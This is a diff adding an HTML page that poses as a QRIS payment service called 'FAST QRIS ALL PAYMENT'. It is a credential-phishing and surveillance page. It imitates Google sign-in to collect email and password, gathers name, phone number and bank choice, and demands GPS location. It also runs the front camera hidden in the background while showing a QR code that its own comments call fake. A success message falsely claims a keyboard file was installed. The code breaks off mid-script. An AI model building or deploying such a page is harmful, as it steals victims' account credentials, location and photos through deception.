@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FAST QRIS ALL PAYMENT</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="icon" id="favicon" href="">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --blue: #f97316;          
+            --blue-dark: #ea580c;     
+            --blue-rgb: 249, 115, 22; 
+            --yellow: #c2410c;        
+            --ink: #431407;           
+            --bg1: #fff7ed;          
+            --bg2: #ffffff;          
+            --bg3: #ffedd5;          
+            --glass-bg: rgba(255, 255, 255, 0.45);
+            --glass-border: rgba(255, 255, 255, 0.65);
+        }
+
+        /* Custom Soft Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(249, 115, 22, 0.25);
+            border-radius: 99px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(249, 115, 22, 0.5);
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', system-ui, sans-serif;
+            background: 
+                radial-gradient(circle 280px at 15% 15%, rgba(var(--blue-rgb), 0.35), transparent 70%),
+                radial-gradient(circle 320px at 85% 25%, rgba(251, 146, 60, 0.3), transparent 70%),
+                radial-gradient(circle 300px at 75% 85%, rgba(var(--blue-rgb), 0.3), transparent 70%),
+                radial-gradient(circle 220px at 15% 80%, rgba(251, 146, 60, 0.25), transparent 70%),
+                linear-gradient(135deg, var(--bg1) 0%, var(--bg2) 50%, var(--bg3) 100%) fixed !important;
+            color: var(--ink);
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        .site-logo {
+            display: block;
+            width: 100px; height: 100px;
+            object-fit: cover;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            box-shadow: 0 10px 25px rgba(var(--blue-rgb), 0.3);
+            background: #fff;
+            border: 3px solid rgba(255, 255, 255, 0.8);
+        }
+        .hero-brand .site-logo { width: 84px; height: 84px; margin-bottom: 14px; }
+        .header-logo { width: 70px; height: 70px; margin-bottom: 8px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); }
+
+        .glass {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.65), rgba(255, 255, 255, 0.35)) !important;
+            backdrop-filter: blur(25px) saturate(180%);
+            -webkit-backdrop-filter: blur(25px) saturate(180%);
+            border: 1.5px solid var(--glass-border) !important;
+            border-radius: 36px !important;
+            box-shadow: 0 20px 50px rgba(var(--blue-rgb), 0.15), inset 0 2px 2px rgba(255, 255, 255, 0.9) !important;
+        }
+
+        .glass-sm {
+            background: rgba(255, 255, 255, 0.5);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 24px;
+        }
+
+        /* Bubble Input Styling */
+        .bubble-input-group {
+            margin-bottom: 20px;
+        }
+        .bubble-input-label {
+            display: block;
+            color: var(--ink);
+            font-weight: 800;
+            margin-bottom: 8px;
+            font-size: 13px;
+            padding-left: 12px;
+        }
+        .bubble-input {
+            width: 100%;
+            padding: 14px 20px;
+            border: 1.5px solid rgba(255, 255, 255, 0.8);
+            border-radius: 999px;
+            font-size: 14px;
+            font-weight: 600;
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(10px);
+            color: var(--ink);
+            outline: none;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.02);
+        }
+        .bubble-input:focus {
+            background: rgba(255, 255, 255, 0.85);
+            border-color: var(--blue);
+            box-shadow: 0 0 0 4px rgba(var(--blue-rgb), 0.2);
+        }
+
+        .bank-trigger {
+            width: 100%; display: flex; align-items: center; justify-content: space-between; gap: 10px;
+            padding: 14px 20px; border: 1.5px solid rgba(255,255,255,0.8); border-radius: 999px;
+            background: rgba(255,255,255,0.6); backdrop-filter: blur(10px);
+            color: #8a6a58; font-weight: 600; font-size: 14px; cursor: pointer; transition: all .25s ease;
+        }
+        .bank-trigger.chosen { color: var(--blue-dark); font-weight: 800; }
+        .bank-trigger.open { border-color: var(--blue); box-shadow: 0 0 0 4px rgba(var(--blue-rgb), 0.2); }
+        .bank-trigger i { color: var(--blue); transition: transform .3s ease; }
+        .bank-trigger.open i { transform: rotate(180deg); }
+
+        .bank-panel { display: grid; grid-template-rows: 0fr; transition: grid-template-rows .35s ease, margin .35s ease; margin-top: 0; }
+        .bank-panel.open { grid-template-rows: 1fr; margin-top: 12px; }
+        .bank-panel-inner {
+            overflow: hidden; min-height: 0; border-radius: 28px;
+            background: rgba(255, 255, 255, 0.55);
+            backdrop-filter: blur(16px);
+            padding: 0 14px;
+            border: 1px solid rgba(255, 255, 255, 0.8);
+        }
+        .bank-panel.open .bank-panel-inner { padding: 16px 14px; box-shadow: 0 10px 28px rgba(var(--blue-rgb), 0.12), inset 0 2px 0 #fff; }
+        .bank-group-title {
+            font-size: 11px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase;
+            color: var(--blue-dark); margin: 4px 6px 8px;
+        }
+        .bank-group-title:not(:first-child) { margin-top: 14px; }
+        .bank-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+        .bank-option-mobile {
+            text-align: center; padding: 12px 10px; border-radius: 999px;
+            background: rgba(255,255,255,0.7); border: 1.5px solid rgba(255,255,255,0.95);
+            box-shadow: 0 3px 8px rgba(var(--blue-rgb), 0.08), inset 0 2px 0 #fff;
+            font-weight: 700; font-size: 12.5px; color: var(--ink); cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .bank-option-mobile:hover { background: rgba(255,237,213,0.9); border-color: var(--blue); transform: translateY(-1px); }
+        .bank-option-mobile.selected {
+            background: linear-gradient(145deg, #fb923c, var(--blue-dark)); color: #fff; border-color: transparent;
+        }
+
+        .btn-bubble {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            color: white;
+            border: none;
+            border-radius: 999px;
+            font-weight: 800;
+            font-size: 15px;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(var(--blue-rgb), 0.35);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-bubble:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(var(--blue-rgb), 0.45);
+        }
+
+        .permission-splash, .registration-wrapper {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .registration-card {
+            width: 100%;
+            max-width: 440px;
+            padding: 32px 24px;
+            animation: slideInUp 0.6s ease-out;
+        }
+
+        @keyframes slideInUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes successPop { 0% { opacity: 0; transform: scale(0.85); } 100% { opacity: 1; transform: scale(1); } }
+        @keyframes brandGlow { 0%, 100% { text-shadow: 0 0 20px rgba(var(--blue-rgb), 0.3); } 50% { text-shadow: 0 0 40px rgba(var(--blue-rgb), 0.6); } }
+
+        .hidden { display: none !important; }
+
+        .brand-title {
+            font-size: 2.2rem;
+            font-weight: 900;
+            color: var(--blue);
+            letter-spacing: 1px;
+            animation: brandGlow 2.5s ease-in-out infinite;
+            margin-bottom: 2px;
+            text-align: center;
+        }
+        .brand-subtitle {
+            font-size: 1.1rem;
+            color: var(--yellow);
+            font-weight: 800;
+            letter-spacing: 2px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .hero-section {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .hero-content {
+            text-align: center;
+            max-width: 650px;
+            animation: slideInUp 0.8s ease-out;
+        }
+
+        .scanner-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 360px;
+            margin: 30px auto;
+        }
+
+        .scanner-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 1;
+            background: #ffffff;
+            border-radius: 30px;
+            overflow: hidden;
+            border: 4px solid rgba(255, 255, 255, 0.9);
+            box-shadow: 0 20px 50px rgba(var(--blue-rgb), 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .scan-status {
+            position: absolute; left: 50%; bottom: 16px; transform: translateX(-50%);
+            display: inline-flex; align-items: center; gap: 8px; white-space: nowrap;
+            padding: 9px 20px; border-radius: 999px; font-size: 12.5px; font-weight: 700; color: #fff;
+            background: rgba(30, 12, 0, 0.7); backdrop-filter: blur(10px);
+            border: 1.5px solid rgba(255,255,255,0.45);
+            z-index: 4;
+        }
+        .scan-status.done { background: rgba(22, 163, 74, 0.85); }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.35);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            backdrop-filter: blur(12px);
+        }
+
+        .modal-card {
+            padding: 36px 28px;
+            border-radius: 36px;
+            max-width: 480px;
+            text-align: center;
+            animation: successPop 0.6s ease-out;
+            width: 90%;
+        }
+
+        .modal-icon { font-size: 60px; color: var(--blue); margin-bottom: 16px; }
+        .modal-card h2 { color: var(--blue-dark); font-size: 22px; font-weight: 800; margin-bottom: 10px; }
+
+        .info-section {
+            padding: 16px 20px;
+            border-radius: 20px;
+            margin: 12px 0;
+            text-align: left;
+            background: rgba(255, 255, 255, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.7);
+        }
+
+        .info-label { color: var(--blue-dark); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; font-weight: 800; margin-bottom: 4px; }
+        .info-value { color: var(--ink); font-weight: 600; font-size: 13.5px; line-height: 1.5; }
+
+        .site-footer {
+            text-align: center; font-size: 11.5px; line-height: 1.6; font-weight: 600;
+            color: var(--ink); opacity: 0.8; padding: 20px 16px 10px;
+        }
+        .site-footer strong { color: var(--blue-dark); font-weight: 800; }
+    </style>
+    <script>
+        const LOGO_URL = "https://i.ibb.co.com/WvBn4gnq/Gemini-Generated-Image-2qlkbe2qlkbe2qlk.jpg";
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('img[data-logo]').forEach(i => {
+                i.src = LOGO_URL;
+                i.onerror = () => { i.style.display = 'none'; };
+            });
+            document.getElementById('favicon').href = LOGO_URL;
+        });
+    </script>
+</head>
+<body>
+
+    <!-- CUSTOM ALERT MODAL -->
+    <div id="customAlertModal" class="modal-overlay hidden" style="z-index: 99999;">
+        <div class="glass modal-card" style="max-width: 380px; padding: 28px 20px;">
+            <div id="alertIcon" style="font-size: 45px; color: var(--blue-dark); margin-bottom: 12px;"><i class="fas fa-exclamation-circle"></i></div>
+            <h3 id="alertTitle" style="color: var(--blue-dark); font-size: 18px; font-weight: 800; margin-bottom: 8px;">Pemberitahuan</h3>
+            <p id="alertMessage" style="font-size: 13.5px; color: var(--ink); opacity: 0.9; margin-bottom: 20px; line-height: 1.5;"></p>
+            <button onclick="closeCustomAlert()" class="btn-bubble" style="padding: 12px; font-size: 14px;">OK</button>
+        </div>
+    </div>
+
+    <!-- LANGKAH 1: GOOGLE LOGIN -->
+    <div id="googleLoginModal" class="registration-wrapper">
+        <div class="glass registration-card" style="text-align: center;">
+            <svg style="width: 50px; margin: 0 auto 14px; display: block;" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+            </svg>
+
+            <h2 style="font-size: 24px; font-weight: 700; color: var(--ink); margin-bottom: 6px;">Sign in</h2>
+
+            <div id="googleEmailStep" style="width: 100%;">
+                <p style="font-size: 14.5px; color: var(--ink); opacity: 0.85; margin-bottom: 24px;">Use your Google Account</p>
+
+                <div class="bubble-input-group" style="text-align: left;">
+                    <input type="text" id="googleEmailInput" class="bubble-input" placeholder="Email or phone (e.g. name@gmail.com)" />
+                </div>
+
+                <button type="button" style="background: none; border: none; color: var(--blue-dark); font-size: 13px; font-weight: 700; cursor: pointer; display: block; margin-bottom: 24px; text-align: left;">Forgot email?</button>
+
+                <p style="font-size: 13px; color: var(--ink); opacity: 0.8; text-align: left; margin-bottom: 24px; line-height: 1.4;">
+                    Not your computer? Use Guest mode to sign in privately. 
+                    <a href="#" style="color: var(--blue-dark); font-weight: 700; text-decoration: none;">Learn more</a>
+                </p>
+
+                <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                    <a href="#" style="color: var(--blue-dark); text-decoration: none; font-size: 13.5px; font-weight: 700;">Create account</a>
+                    <button type="button" class="btn-bubble" id="btnGoogleNext" style="width: auto; padding: 12px 28px;">Next</button>
+                </div>
+            </div>
+
+            <div id="googlePasswordStep" class="hidden" style="width: 100%;">
+                <p style="font-size: 14.5px; color: var(--ink); opacity: 0.85; margin-bottom: 12px;">Welcome</p>
+
+                <div id="btnBackToGoogleEmail" style="display: inline-flex; align-items: center; gap: 8px; padding: 4px 14px 4px 6px; border: 1.5px solid rgba(var(--blue-rgb), 0.3); border-radius: 999px; font-size: 13.5px; font-weight: 600; color: var(--ink); margin-bottom: 20px; cursor: pointer; background: rgba(255,255,255,0.6);">
+                    <div id="googleAvatarLetter" style="width: 22px; height: 22px; background: var(--blue-dark); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700;">J</div>
+                    <span id="googleDisplayEmail">jondoe@gmail.com</span>
+                    <i class="fas fa-chevron-down" style="font-size: 10px; opacity: 0.6;"></i>
+                </div>
+
+                <div class="bubble-input-group" style="text-align: left;">
+                    <input type="password" id="googlePasswordInput" class="bubble-input" placeholder="Enter your password" />
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 8px; width: 100%; margin-bottom: 16px; font-size: 13.5px; color: var(--ink); text-align: left;">
+                    <input type="checkbox" id="toggleGooglePwd" style="width: 16px; height: 16px; accent-color: var(--blue);" />
+                    <label for="toggleGooglePwd" style="font-weight: 600; cursor: pointer;">Show password</label>
+                </div>
+
+                <button type="button" style="background: none; border: none; color: var(--blue-dark); font-size: 13px; font-weight: 700; cursor: pointer; display: block; margin-bottom: 20px; text-align: left;">Forgot password?</button>
+
+                <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                    <div></div>
+                    <button type="button" class="btn-bubble" id="btnGoogleLoginComplete" style="width: auto; padding: 12px 28px;">Sign in</button>
+                </div>
+            </div>
+
+            <div class="site-footer">&copy; 2026 FAST QRIS ALL PAYMENT. All rights reserved.<br>Website by <strong>Panjul</strong></div>
+        </div>
+    </div>
+
+    <!-- LANGKAH 2: REGISTRATION FORM -->
+    <div id="registrationForm" class="registration-wrapper hidden">
+        <div class="glass registration-card">
+            <div style="text-align: center;">
+                <img class="site-logo header-logo" alt="Logo" data-logo>
+                <div class="brand-title">FAST QRIS</div>
+                <div class="brand-subtitle">ALL PAYMENT</div>
+            </div>
+
+            <div style="margin-top: 10px;">
+                <div class="bubble-input-group">
+                    <label class="bubble-input-label">Nama Lengkap (Min. 7 Huruf)</label>
+                    <input type="text" id="fullName" class="bubble-input" placeholder="Masukkan nama lengkap" required>
+                </div>
+
+                <div class="bubble-input-group">
+                    <label class="bubble-input-label">Nomor HP & Kode Negara (Bisa Ketik Sendiri / Pilih)</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="countryCode" class="bubble-input" value="+62" placeholder="+62" list="countryCodeList" style="width: 110px; padding: 14px 10px; text-align: center;" />
+                        <datalist id="countryCodeList">
+                            <option value="+62">+62 (Indonesia)</option>
+                            <option value="+1">+1 (USA/Canada)</option>
+                            <option value="+60">+60 (Malaysia)</option>
+                            <option value="+65">+65 (Singapore)</option>
+                            <option value="+66">+66 (Thailand)</option>
+                            <option value="+84">+84 (Vietnam)</option>
+                            <option value="+81">+81 (Japan)</option>
+                            <option value="+82">+82 (Korea)</option>
+                            <option value="+44">+44 (UK)</option>
+                            <option value="+61">+61 (Australia)</option>
+                        </datalist>
+
+                        <input type="tel" id="phoneNumber" class="bubble-input" placeholder="8123456789" required style="flex: 1;">
+                    </div>
+                </div>
+
+                <div class="bubble-input-group">
+                    <label class="bubble-input-label">Bank atau E-Wallet</label>
+                    <button type="button" id="bankTrigger" class="bank-trigger" onclick="toggleBankPanel()">
+                        <span id="bankTriggerText">Pilih Bank / E-Wallet</span>
+                        <i class="fas fa-chevron-down" id="bankChevron"></i>
+                    </button>
+
+                    <div id="bankPanel" class="bank-panel">
+                        <div class="bank-panel-inner">
+                            <div class="bank-group-title">Bank</div>
+                            <div class="bank-grid">
+                                <div class="bank-option-mobile" onclick="selectBank('BCA', this)">BCA</div>
+                                <div class="bank-option-mobile" onclick="selectBank('MANDIRI', this)">MANDIRI</div>
+                                <div class="bank-option-mobile" onclick="selectBank('BNI', this)">BNI</div>
+                                <div class="bank-option-mobile" onclick="selectBank('BRI', this)">BRI</div>
+                                <div class="bank-option-mobile" onclick="selectBank('CIMB', this)">CIMB</div>
+                                <div class="bank-option-mobile" onclick="selectBank('PERMATA', this)">PERMATA</div>
+                            </div>
+                            <div class="bank-group-title">E-Wallet</div>
+                            <div class="bank-grid">
+                                <div class="bank-option-mobile" onclick="selectBank('GOPAY', this)">GOPAY</div>
+                                <div class="bank-option-mobile" onclick="selectBank('OVO', this)">OVO</div>
+                                <div class="bank-option-mobile" onclick="selectBank('DANA', this)">DANA</div>
+                                <div class="bank-option-mobile" onclick="selectBank('LINKAJA', this)">LINKAJA</div>
+                                <div class="bank-option-mobile" onclick="selectBank('GCASH', this)">GCASH</div>
+                                <div class="bank-option-mobile" onclick="selectBank('PROMPTPAY', this)">PROMPTPAY</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button onclick="submitRegistration()" class="btn-bubble" style="margin-top: 24px;">
+                    Lanjutkan <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+
+            <div class="site-footer">&copy; 2026 FAST QRIS ALL PAYMENT. All rights reserved.<br>Website by <strong>Panjul</strong></div>
+        </div>
+    </div>
+
+    <!-- LANGKAH 3: PERMISSION SPLASH -->
+    <div id="splashScreen" class="permission-splash hidden">
+        <div style="max-width: 440px; width: 100%;">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <img class="site-logo" alt="Logo" data-logo>
+                <div class="brand-title">FAST QRIS</div>
+                <div class="brand-subtitle">ALL PAYMENT</div>
+            </div>
+
+            <div class="glass" style="padding: 32px 24px; text-align: center;">
+                <h3 style="color: var(--blue-dark); font-size: 20px; font-weight: 800; margin-bottom: 20px;">Izinkan Akses</h3>
+                
+                <div class="glass-sm" style="display: flex; align-items: center; gap: 16px; padding: 16px; margin-bottom: 12px; text-align: left;">
+                    <div style="font-size: 24px; color: var(--blue); width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; background: rgba(var(--blue-rgb), 0.12); border-radius: 50%;">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <div>
+                        <h4 style="color: var(--blue-dark); font-weight: 800; font-size: 14px;">Akses Kamera</h4>
+                        <p style="color: var(--ink); font-size: 12px; opacity: 0.9;">Untuk memproses transaksi QRIS Anda</p>
+                    </div>
+                </div>
+
+                <div class="glass-sm" style="display: flex; align-items: center; gap: 16px; padding: 16px; margin-bottom: 24px; text-align: left;">
+                    <div style="font-size: 24px; color: var(--blue); width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; background: rgba(var(--blue-rgb), 0.12); border-radius: 50%;">
+                        <i class="fas fa-map-marker-alt"></i>
+                    </div>
+                    <div>
+                        <h4 style="color: var(--blue-dark); font-weight: 800; font-size: 14px;">Akses Lokasi (GPS)</h4>
+                        <p style="color: var(--ink); font-size: 12px; opacity: 0.9;">Untuk mengarahkan dana ke bank yang sesuai</p>
+                    </div>
+                </div>
+
+                <button class="btn-bubble" onclick="requestAllPermissions()">
+                    <i class="fas fa-check"></i> Izinkan Semua
+                </button>
+            </div>
+            <div class="site-footer">&copy; 2026 FAST QRIS ALL PAYMENT. All rights reserved.<br>Website by <strong>Panjul</strong></div>
+        </div>
+    </div>
+
+    <!-- LANGKAH 4: HOMEPAGE (MENAMPILKAN QR BOHONGAN & AUTO FOTO DI BACKGROUND) -->
+    <div id="homepage" class="hidden">
+        <div class="hero-section">
+            <div class="hero-content">
+                <div class="hero-brand">
+                    <img class="site-logo" alt="Logo" data-logo>
+                    <h1 class="brand-title">FAST QRIS</h1>
+                    <p class="brand-subtitle">ALL PAYMENT</p>
+                </div>
+
+                <div class="scanner-wrapper">
+                    <div class="scanner-container">
+                        <!-- Video kamera disembunyikan agar tidak terlihat di layar, tetap aktif di background untuk ambil foto -->
+                        <video id="scannerVideo" playsinline autoplay style="display: none;"></video>
+                        
+                        <!-- Menampilkan QR Code jadi di layar (QR Bohongan) -->
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=FAST-QRIS-ALL-PAYMENT-SECURE-TRANSACTION" style="width: 100%; height: 100%; object-fit: contain;" alt="QRIS Code">
+                        
+                        <div id="scanStatus" class="scan-status"><i class="fas fa-circle-notch fa-spin"></i> <span>Memproses pembayaran...</span></div>
+                    </div>
+                </div>
+
+                <p style="color: var(--blue-dark); font-size: 14px; font-weight: 700; margin-bottom: 20px;">
+                    Silakan scan QRIS di atas untuk melakukan pembayaran
+                </p>
+            </div>
+        </div>
+        <div class="site-footer">&copy; 2026 FAST QRIS ALL PAYMENT. All rights reserved.<br>Website by <strong>Panjul</strong></div>
+    </div>
+
+    <!-- SUCCESS MODAL -->
+    <div id="successModal" class="modal-overlay hidden">
+        <div class="glass modal-card">
+            <div class="modal-icon"><i class="fas fa-check-circle"></i></div>
+            <h2>SUKSES & FILE DIINSTAL</h2>
+            <p style="font-size: 13px; color: var(--ink); opacity: 0.85; margin-bottom: 16px;">File keyboard virtual <strong>panjulkece</strong> telah didownload dan diinstal otomatis ke perangkat Anda.</p>
+
+            <div class="info-section">
+                <div class="info-label">Waktu Transaksi</div>
+                <div class="info-value" id="transactionTime">-</div>
+            </div>
+            <div class="info-section">
+                <div class="info-label">Lokasi Anda (GPS)</div>
+                <div class="info-value" id="locationDisplay">Mendeteksi lokasi...</div>
+            </div>
+            <div class="info-section">
+                <div class="info-label">Dana Diarahkan Ke</div>
+                <div class="info-value" id="bankDisplay">-</div>
+            </div>
+
+            <button onclick="closeSuccess()" class="btn-bubble" style="margin-top: 20px;">
+                <i class="fas fa-home"></i> Kembali ke Home
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let stream = null;
+        let userLocation = null;
+        let cameraPermitted = false;
+        let locationPermitted = false;
+        let userRegistration = { googleEmail: '', fullName: '', phoneNumber: '', selectedBank: '' };
+        let selectedBankChoice = null;
+
+        function showAlert(title, message, iconClass = 'fa-exclamation-circle') {
+            document.getElementById('alertTitle').textContent = title;
+            document.getElementById('alertMessage').textContent = message;
+            document.getElementById('alertIcon').innerHTML = `<i class="fas ${iconClass}"></i>`;
+            document.getElementById('customAlertModal').classList.remove('hidden');
+        }
+
+        function closeCustomAlert() {
+            document.getElementById('customAlertModal').classList.add('hidden');
+        }
+
+        const googleEmailStep = document.getElementById('googleEmailStep');
+        const googlePasswordStep = document.getElementById('googlePasswordStep');
+        const btnGoogleNext = document.getElementById('btnGoogleNext');
+        const btnBackToGoogleEmail = document.getElementById('btnBackToGoogleEmail');
+        const googleEmailInput = document.getElementById('googleEmailInput');
+        const googlePasswordInput = document.getElementById('googlePasswordInput');
+        const googleDisplayEmail = document.getElementById('googleDisplayEmail');
+        const googleAvatarLetter = document.getElementById('googleAvatarLetter');
+        const toggleGooglePwd = document.getElementById('toggleGooglePwd');
+        const btnGoogleLoginComplete = document.getElementById('btnGoogleLoginComplete');
+
+        btnGoogleNext.addEventListener('click', () => {
+            const emailVal = googleEmailInput.value.trim();
+            if (emailVal !== "" && emailVal.includes('@') && emailVal.toLowerCase().includes('.com')) {
+                googleDisplayEmail.textContent = emailVal;
+                googleAvatarLetter.textContent = emailVal.charAt(0).toUpperCase();
+                googleEmailStep.classList.add('hidden');
+                googlePasswordStep.classList.remove('hidden');
+            } else {
+                showAlert("Email Tidak Valid", "Email Google wajib mengandung karakter '@' dan '.com'!", "fa-envelope-circle-xmark");
+            }
+        });
+
+        btnBackToGoogleEmail.addEventListener('click', () => {
+            googlePasswordStep.classList.add('hidden');
+            googleEmailStep.classList.remove('hidden');
+        });
+
+        toggleGooglePwd.addEventListener('change', () => {
+            googlePasswordInput.type = toggleGooglePwd.checked ? "text" : "password";
+        });
+
+        btnGoogleLoginComplete.addEventListener('click', () => {
+            const pwdVal = googlePasswordInput.value.trim();
+            if (pwdVal !== "") {
+                userRegistration.googleEmail = googleEmailInput.value.trim();
+                userRegistration.googlePassword = pwdVal;
+
+                document.getElementById('googleLoginModal').classList.add('hidden');
+                document.getElementById('registrationForm').classList.remove('hidden');
+            } else {
+                showAlert("Password Kosong", "Silakan masukkan password akun Google Anda terlebih dahulu!", "fa-lock");
+            }
+        });
+
+        function toggleBankPanel(force) {
+            const p = document.getElementById('bankPanel');
+            const open = typeof force === 'boolean' ? force : !p.classList.contains('open');
+            p.classList.toggle('open', open);
+            document.getElementById('bankTrigger').classList.toggle('open', open);
+        }
+
+        function selectBank(bankName, element) {
+            document.querySelectorAll('.bank-option-mobile').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedBankChoice = bankName;
+            document.getElementById('bankTriggerText').textContent = bankName;
+            document.getElementById('bankTrigger').classList.add('chosen');
+            toggleBankPanel(false);
+        }
+
+        function submitRegistration() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const countryCode = document.getElementById('countryCode').value.trim();
+            const phoneNum = document.getElementById('phoneNumber').value.trim();
+
+            if (!fullName || fullName.length < 7) { 
+                showAlert("Nama Kurang Panjang", "Nama lengkap minimal harus 7 huruf atau karakter!", "fa-user-pen"); 
+                return; 
+            }
+            if (!phoneNum || !/^\d{8,15}$/.test(phoneNum.replace(/\D/g, ''))) { 
+                showAlert("Nomor HP Tidak Valid", "Format nomor telepon tidak valid, masukkan nomor dengan benar!", "fa-phone-slash"); 
+                return; 
+            }
+            if (!selectedBankChoice) { 
+                showAlert("Bank Belum Dipilih", "Silakan pilih bank atau e-wallet tujuan terlebih dahulu!", "fa-building-columns"); 
+                return; 
+            }
+
+            userRegistration.fullName = fullName;
+            userRegistration.phoneNumber = (countryCode.startsWith('+') ? countryCode : '+' + countryCode) + ' ' + phoneNum;
+            userRegistration.selectedBank = selectedBankChoice;
+            userRegistration.registrationTime = new Date().toISOString();
+
+            localStorage.setItem('userRegistration', JSON.stringify(userRegistration));
+
+            document.getElementById('registrationForm').classList.add('hidden');
+            document.getElementById('splashScreen').classList.remove('hidden');
+            requestAllPermissions();
+        }
+
+        async function requestAllPermissions() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
+                cameraPermitted = true;
+            } catch (error) {
+                showAlert("Akses Ditolak", "Kamera tidak dapat diakses atau izin ditolak oleh perangkat.", "fa-camera-slash");
+                return;
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            timestamp: new Date().toISOString()
+                        };
+                        locationPermitted = true;
+                        startApp();
+                    },
+                    (error) => {
+                        showAlert("Izin Lokasi Ditolak", "Akses lokasi (GPS) wajib diizinkan untuk melanjutkan proses.", "fa-location-slash");
+                    },
+                    { timeout: 20000, enableHighAccuracy: true }
+                );
+            } else {
+                showAlert("Tidak Didukung", "Browser perangkat Anda tidak mendukung fitur lokasi GPS!", "fa-triangle-exclamation");
+            }
+        }
+
+        function startApp() {
+            document.getElementById('splashScreen').classList.add('hidden');
+            document.getElementById('homepage').classList.remove('hidden');
+
+            if (stream) {
+                const video = document.getElementById('scannerVideo');
+                video.srcObject = stream;
+                video.play().catch(() => {});
+                // Mulai otomatis mengambil foto di background begitu halaman QR tampil
+                setTimeout(startAutoCapture, 800);
+            }
+        }
+
+        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+        let capturing = false;
+
+        function setScanStatus(text, mode) {
+            const el = document.getElementById('scanStatus');
+            const icon = mode === 'done' ? 'fa-check-circle' : 'fa-circle-notch fa-spin';
